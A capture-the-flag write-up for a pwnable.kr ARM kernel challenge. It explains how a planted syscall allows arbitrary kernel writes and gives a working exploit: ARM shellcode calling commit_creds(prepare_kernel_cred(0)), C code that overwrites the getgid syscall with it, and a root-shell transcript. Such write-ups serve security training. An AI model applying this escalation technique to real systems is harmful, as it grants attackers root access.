This is the first kernel exploitation challenge on pwnable.kr and it might seem scary, especially if you
have never done kernel exploitation before. So let's clarify some concepts which will help us
to better cognize the challenge:

### Process address space
In Linux each process has it's own virtual address space which is divided into two parts -
user space and kernel space (typically located at the lower and upper end of the address space respectively).
To prevent programs from tinkering with the kernel's memory, kernel space
can only be accessed when in kernel mode. To enter that mode processes usually invoke a system call
(like read, write etc). It's the kernel job then to safely handle the processes' requests, assuring
they are not trying to do anything outside their permissions.

### Kernel modules
The Linux kernel is monolithic but also modular, meaning you can add functionality to it by compiling it
with additional modules. The source code for this challenge defines such a module via the
`module_init` and `module_exit` macros:

```c
// adding a new system call : sys_upper

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/vmalloc.h>
#include <linux/mm.h>
#include <asm/unistd.h>
#include <asm/page.h>
#include <linux/syscalls.h>

#define SYS_CALL_TABLE		0x8000e348		// manually configure this address!!
#define NR_SYS_UNUSED		223

//Pointers to re-mapped writable pages
unsigned int** sct;

asmlinkage long sys_upper(char *in, char* out){
	int len = strlen(in);
	int i;
	for(i=0; i<len; i++){
		if(in[i]>=0x61 && in[i]<=0x7a){
			out[i] = in[i] - 0x20;
		}
		else{
			out[i] = in[i];
		}
	}
	return 0;
}

static int __init initmodule(void ){
	sct = (unsigned int**)SYS_CALL_TABLE;
	sct[NR_SYS_UNUSED] = sys_upper;
	printk("sys_upper(number : 223) is added\n");
	return 0;
}

static void __exit exitmodule(void ){
	return;
}

module_init( initmodule );
module_exit( exitmodule );
```

As you can see this module's initialization function (`initmodule`)
is modifying the kernel's syscall table so that `sys_upper` can be invoked as a syscall with number 223.
The `sys_upper` function itself simply copies a string from `in` to `out`,
replacing any lower case characters with their upper case equivalents.

Equiped with the notion of user and kernel space we spot a potential vulnerability:
Since `sys_upper` is a syscall, it gets executed with kernel privilages,
meaning that we can copy strings (specifically malicious ones!) to any address including those in kernel space.

So let's write a shellcode that escalates out privilages and inject it somewehere in the kernel.
The easiest way to achieve this is by combining the following kernel functions:

```c
commit_creds(prepare_kernel_cred(NULL))
```
Explanation:

- `prepare_kernel_cred(NULL)` - when invoked with `NULL` this function returns a pointer
  to a credentials struct that encodes root privilages.
- `commit_creds(struct cred*)` - applies/"commits" credentials.

You can find the symbols of these functions by reading from `/proc/kallsyms` on the pwnable server.

### ARM calling convention:
The pwnable server is using `32-bit arm` architecture.
For a somewhat-complete overview of `arm`'s calling convention you can read [here](https://en.wikipedia.org/wiki/Calling_convention#ARM_(A32)).
What's most important to us is how arguments are passed to funcitons, as it's different from `x86`:
`r0 to r3 hold argument values passed to a subroutine and results returned from a subroutine.`
With the arm semantics in mind I constructed the following shellcode (note, you might have to install an `arm` toolchain for the assembling):
```python
from pwn import *

context.arch = 'arm'

shellcode = asm('''
push {r3, fp, lr}
add  fp, sp, $4
ldr  r1, =0x80064c8c
blx  r1
ldr  r1, =0x8003f924
blx  r1
ldr  r1, =0x8003f55c
add  r1, $0x10
blx  r1
pop  {r3, fp, pc}
''')

print(''.join('\\x{:02x}'.format(byte) for byte in shellcode))
```
I couldn't figure out how to embed commetns into the assembly string so here are some clarifications:

- `0x80064c8c` - the address of `bool is_module_address(unsigned long addr)`, this is a random kernel function which
  fortunatelly happened to return 0. This call is necessary for zeroing out `r0` which can't be done by
  any of the conventional `xor r0, r1, r1`, `mov r0, #0`, etc. instructions since all of them contain
  a `\x00` (string termination) byte in their assembled versions.
- `0x8003f924` - the address of `prepare_kernel_cred()`, to invoke it with `NULL` `r0` has to be 0.
- `0x8003f56c` - the address of `commit_creds(struct cred *)`, We call this function just after `prepare_kernel_cred` so that
  the return value of the latter (that is the root privilage credential struct) is used as the function argument.
- Pushing/Poping the `r3` register and spliting the `commit_creds`' address is necessary
  for not having lower case characters and the `\x00` byte as parts of the shellcode.

Now, back to the exploit, I inserted the script output into the `shellcode` variable in the C snippet bellow.
As you can see it does not contain any `\x00` bytes or bytes lying in the `[\x61, \x7a]` range which means
the shellcode would be copied identically. I used the `getgid` syscall for the shellcode destination:
```c
#include <stdint.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdlib.h>

char shellcode[] = "\x08\x48\x2d\xe9\x04\xb0\x8d\xe2\x18\x10\x9f\xe5\x31\xff\x2f\xe1\x14\x10\x9f\xe5\x31\xff\x2f\xe1\x10\x10\x9f\xe5\x10\x10\x81\xe2\x31\xff\x2f\xe1\x08\x88\xbd\xe8\x8c\x4c\x06\x80\x24\xf9\x03\x80\x5c\xf5\x03\x80";

int main() {
	uintptr_t sys_getgid = 0x8002f958;
	syscall(223, shellcode, sys_getgid);
	syscall(SYS_getgid);
	system("/bin/sh");
	return 0;
}
```

After gaining root privilages we can just get shell and go on about our day.

Here is a showcase of the final exploit on the pwnable server, don't worry about the `can't access tty` message,
`/bin/sh` still gets executed successfully:

```
/tmp $ gcc exploit.c
/tmp $ ./a.out
/bin/sh: can't access tty; job control turned off
/tmp $ cat /root/flag
...(flag)...
```
